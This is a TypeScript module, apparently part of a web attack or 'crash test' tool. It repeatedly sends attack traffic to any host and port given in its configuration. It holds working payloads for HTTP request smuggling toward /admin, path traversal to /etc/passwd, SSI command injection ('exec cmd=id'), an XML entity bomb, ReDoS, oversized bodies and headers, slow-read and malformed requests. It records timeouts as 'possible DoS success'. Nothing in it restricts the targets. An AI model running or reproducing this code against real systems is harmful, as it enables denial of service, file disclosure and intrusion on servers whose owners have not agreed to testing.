import * as http from "http";
import * as https from "https";
import * as net from "net";
import { randomBytes } from "crypto";

export interface CrashTestConfig {
  target: string;
  port: number;
  path: string;
  technique: string;
  threads: number;
  duration: number;
}

export interface CrashTestJob {
  id: string;
  config: CrashTestConfig;
  startTime: number;
  endTime: number;
  active: boolean;
  results: CrashTestResult[];
  intervals: NodeJS.Timeout[];
  sockets: net.Socket[];
  trafficLog: string[];
}

export interface CrashTestResult {
  technique: string;
  status: "sent" | "error" | "crash_indicator" | "timeout" | "anomaly";
  statusCode?: number;
  responseTime?: number;
  responseSnippet?: string;
  timestamp: number;
  detail: string;
}

const jobs = new Map<string, CrashTestJob>();

function makeId() {
  return randomBytes(8).toString("hex");
}

function isCrashIndicator(code: number, body: string): boolean {
  if (code === 500 || code === 502 || code === 503) return true;
  const crash = ["fatal error", "out of memory", "segfault", "core dump", "exception", "stack trace", "unhandled", "crash", "nginx", "502 bad gateway", "503 service unavailable"];
  return crash.some((k) => body.toLowerCase().includes(k));
}

function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 2000) log.splice(0, log.length - 2000); }

function makeRequest(
  opts: http.RequestOptions,
  body: string | Buffer | null,
  isHttps: boolean,
  trafficLog: string[],
  onResult: (result: Partial<CrashTestResult>) => void
) {
  const mod = isHttps ? https : http;
  const start = Date.now();
  const ts = tsFmt();
  const method = opts.method ?? "GET";
  const path = String(opts.path ?? "/");
  const hostname = String(opts.hostname ?? "");
  const port = opts.port;
  const reqLines = [
    `[${ts}] ─── CRASH PROBE ────────────────────────────────────`,
    `[${ts}] → ${method} ${path} HTTP/1.1`,
    `[${ts}] → Host: ${hostname}:${port}`,
    ...Object.entries(opts.headers ?? {}).map(([k, v]) => `[${ts}] → ${k}: ${v}`),
    `[${ts}] →`,
  ];
  if (body) {
    const preview = Buffer.isBuffer(body) ? `<binary ${body.length} bytes>` : String(body).slice(0, 200);
    reqLines.push(`[${ts}] → ${preview}`);
  }
  pushLog(trafficLog, reqLines);

  const req = mod.request({ ...opts, rejectUnauthorized: false, timeout: 8000 }, (res) => {
    let data = "";
    res.on("data", (c: Buffer) => { data += c.toString().slice(0, 512); });
    res.on("end", () => {
      const rt = Date.now() - start;
      const crash = isCrashIndicator(res.statusCode ?? 0, data);
      const ts2 = tsFmt();
      pushLog(trafficLog, [
        `[${ts2}] ← HTTP/1.1 ${res.statusCode} ${res.statusMessage ?? ""}`,
        ...Object.entries(res.headers).map(([k, v]) => `[${ts2}] ← ${k}: ${Array.isArray(v) ? v.join(", ") : v}`),
        `[${ts2}] ←`,
        `[${ts2}] ← ${data.slice(0, 300).replace(/\r?\n/g, " ↵ ")}`,
        `[${ts2}] • RTT: ${rt}ms ${crash ? "[ CRASH INDICATOR ]" : ""}`,
      ]);
      onResult({
        status: crash ? "crash_indicator" : rt > 5000 ? "anomaly" : "sent",
        statusCode: res.statusCode,
        responseTime: rt,
        responseSnippet: data.slice(0, 200),
      });
    });
  });
  req.on("timeout", () => {
    pushLog(trafficLog, [`[${tsFmt()}] ! TIMEOUT 8000ms — possible DoS success`]);
    req.destroy(); onResult({ status: "timeout", responseTime: 8000 });
  });
  req.on("error", (e) => {
    pushLog(trafficLog, [`[${tsFmt()}] ! CONNECTION ERROR: ${e.message}`]);
    onResult({ status: "error", detail: e.message });
  });
  if (body) req.write(body);
  req.end();
}

export function startCrashTest(config: CrashTestConfig): CrashTestJob {
  const id = makeId();
  const now = Date.now();
  const job: CrashTestJob = {
    id, config,
    startTime: now,
    endTime: now + config.duration * 1000,
    active: true, results: [], trafficLog: [],
    intervals: [], sockets: [],
  };
  jobs.set(id, job);

  const isHttps = config.port === 443;
  const baseOpts: http.RequestOptions = {
    hostname: config.target, port: config.port,
    rejectUnauthorized: false, timeout: 8000,
  };

  const addResult = (r: Partial<CrashTestResult>, technique: string) => {
    job.results.push({
      technique,
      status: r.status ?? "sent",
      statusCode: r.statusCode,
      responseTime: r.responseTime,
      responseSnippet: r.responseSnippet,
      timestamp: Date.now(),
      detail: r.detail ?? (r.status === "crash_indicator" ? "Crash indicator detected in response" : r.status === "timeout" ? "Server did not respond within 8s" : ""),
    });
    if (job.results.length > 500) job.results = job.results.slice(-400);
  };

  const TECHNIQUES: Record<string, () => void> = {
    "large-payload": () => {
      const body = "A".repeat(1024 * 1024 * 10);
      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "large-payload"));
    },
    "null-byte": () => {
      const path = config.path + "%00" + "A".repeat(256);
      makeRequest({ ...baseOpts, path, method: "GET" }, null, isHttps, job.trafficLog, (r) => addResult(r, "null-byte"));
    },
    "header-overflow": () => {
      const headers: Record<string, string> = {};
      for (let i = 0; i < 100; i++) headers[`X-Custom-Header-${i}`] = "A".repeat(8192);
      makeRequest({ ...baseOpts, path: config.path, method: "GET", headers }, null, isHttps, job.trafficLog, (r) => addResult(r, "header-overflow"));
    },
    "http-smuggling": () => {
      const raw = `POST ${config.path} HTTP/1.1\r\nHost: ${config.target}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: ${config.target}\r\n\r\n`;
      const sock = new net.Socket();
      job.sockets.push(sock);
      sock.setTimeout(5000);
      sock.connect(config.port, config.target, () => {
        sock.write(raw);
        let resp = "";
        sock.on("data", (d: Buffer) => { resp += d.toString(); });
        sock.on("close", () => {
          const crash = isCrashIndicator(0, resp);
          addResult({ status: crash ? "crash_indicator" : "sent", responseSnippet: resp.slice(0, 200) }, "http-smuggling");
          const idx = job.sockets.indexOf(sock);
          if (idx !== -1) job.sockets.splice(idx, 1);
        });
      });
      sock.on("timeout", () => { sock.destroy(); addResult({ status: "timeout" }, "http-smuggling"); });
      sock.on("error", (e) => { addResult({ status: "error", detail: e.message }, "http-smuggling"); });
    },
    "redos": () => {
      const evil = "a".repeat(50) + "!";
      const body = `input=${encodeURIComponent(evil)}&pattern=${encodeURIComponent("(a+)+$")}`;
      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "redos"));
    },
    "path-traversal": () => {
      const paths = [
        config.path + "/../../../etc/passwd",
        config.path + "/..%2F..%2F..%2Fetc%2Fpasswd",
        config.path + "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        config.path + "/....//....//....//etc/passwd",
        config.path + "/%252e%252e%252fetc%252fpasswd",
      ];
      paths.forEach((p) => makeRequest({ ...baseOpts, path: p, method: "GET" }, null, isHttps, job.trafficLog, (r) => addResult(r, "path-traversal")));
    },
    "malformed-http": () => {
      const payloads = [
        `AAAA ${config.path} HTTP/1.1\r\nHost: ${config.target}\r\n\r\n`,
        `GET ${config.path} HTTP/9.9\r\nHost: ${config.target}\r\n\r\n`,
        `GET ${config.path}\r\n\r\n`,
        `GET ${config.path} HTTP/1.1\r\n${"X: " + "A".repeat(65535)}\r\n\r\n`,
        "\x00\x01\x02\x03\xff\xfe\xfd\xfc",
      ];
      payloads.forEach((raw, i) => {
        const sock = new net.Socket();
        job.sockets.push(sock);
        sock.setTimeout(4000);
        sock.connect(config.port, config.target, () => {
          sock.write(raw);
          let resp = "";
          sock.on("data", (d: Buffer) => { resp += d.toString(); });
          sock.on("close", () => addResult({ status: "sent", responseSnippet: resp.slice(0, 200) }, "malformed-http"));
        });
        sock.on("error", (e) => addResult({ status: "error", detail: e.message }, "malformed-http"));
        sock.on("timeout", () => { sock.destroy(); addResult({ status: "timeout" }, "malformed-http"); });
      });
    },
    "ssi-injection": () => {
      const payloads = [
        `<!--#exec cmd="id"-->`,
        `<!--#include virtual="/etc/passwd"-->`,
        `<!--#printenv -->`,
      ];
      payloads.forEach((p) => {
        const body = `input=${encodeURIComponent(p)}`;
        makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "ssi-injection"));
      });
    },
    "xml-bomb": () => {
      const bomb = `<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><root>&d;</root>`;
      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/xml", "Content-Length": String(bomb.length) } }, bomb, isHttps, job.trafficLog, (r) => addResult(r, "xml-bomb"));
    },
    "slow-read": () => {
      const sock = new net.Socket();
      job.sockets.push(sock);
      sock.connect(config.port, config.target, () => {
        sock.write(`GET ${config.path} HTTP/1.1\r\nHost: ${config.target}\r\nRange: bytes=0-\r\n\r\n`);
        let recv = 0;
        sock.on("data", (d: Buffer) => { recv += d.length; });
        setTimeout(() => {
          sock.destroy();
          addResult({ status: recv > 0 ? "sent" : "error", detail: `Read ${recv} bytes slowly — tests server timeout enforcement` }, "slow-read");
        }, 6000);
      });
      sock.on("error", (e) => addResult({ status: "error", detail: e.message }, "slow-read"));
    },
    "format-string": () => {
      const payloads = ["%s%s%s%s%s%s%s%s%s%s", "%x%x%x%x%x%x", "%n%n%n%n%n%n", "%.2000d", "%1000000d"];
      payloads.forEach((p) => {
        const body = `input=${encodeURIComponent(p)}`;
        makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "format-string"));
      });
    },
  };

  const TECHNIQUE_LIST = Object.keys(TECHNIQUES);
  const chosen = config.technique === "all" ? TECHNIQUE_LIST : [config.technique];

  const run = () => {
    if (!job.active) return;
    chosen.forEach((t) => { if (TECHNIQUES[t]) TECHNIQUES[t](); });
  };

  run();
  if (config.duration > 5) {
    const tid = setInterval(() => {
      if (!job.active) { clearInterval(tid); return; }
      run();
    }, 3000);
    job.intervals.push(tid);
  }

  const stopTimer = setTimeout(() => stopCrashTest(id), config.duration * 1000 + 500);
  job.intervals.push(stopTimer as unknown as NodeJS.Timeout);

  return job;
}

export function getCrashJob(id: string): CrashTestJob | undefined {
  return jobs.get(id);
}

export function stopCrashTest(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  job.intervals.forEach((t) => clearInterval(t));
  job.sockets.forEach((s) => { try { s.destroy(); } catch {} });
  jobs.delete(id);
  return true;
}
